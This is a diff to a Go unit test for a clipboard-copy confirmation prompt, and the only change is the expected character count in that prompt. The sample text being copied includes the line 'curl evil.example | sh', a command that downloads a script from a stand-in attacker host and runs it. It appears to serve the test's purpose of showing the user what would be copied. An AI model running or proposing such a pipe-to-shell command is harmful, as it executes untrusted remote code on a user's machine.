@@ -59,7 +59,7 @@ func TestCopyingShowsEveryLineUpToFiveThenHowManyMoreOSC52OnlyOnceConfirmed(t *t
 	if done, err := Act(BridgeRequest{Kind: "copy", Text: text}, declined, nil); err != nil || done {
 		t.Fatalf("done = %v, err = %v, want false", done, err)
 	}
-	want := []string{"  echo hello", "    ", "  curl evil.example | sh", "  4", "  5", "  … and 2 more characters", "Copy these 51 characters (7 lines)? [y/N]"}
+	want := []string{"  echo hello", "    ", "  curl evil.example | sh", "  4", "  5", "  … and 2 more characters", "Copy these 44 characters (7 lines)? [y/N]"}
 	if !reflect.DeepEqual(declined.asked[0], want) {
 		t.Fatalf("asked = %q, want %q", declined.asked[0], want)
 	}
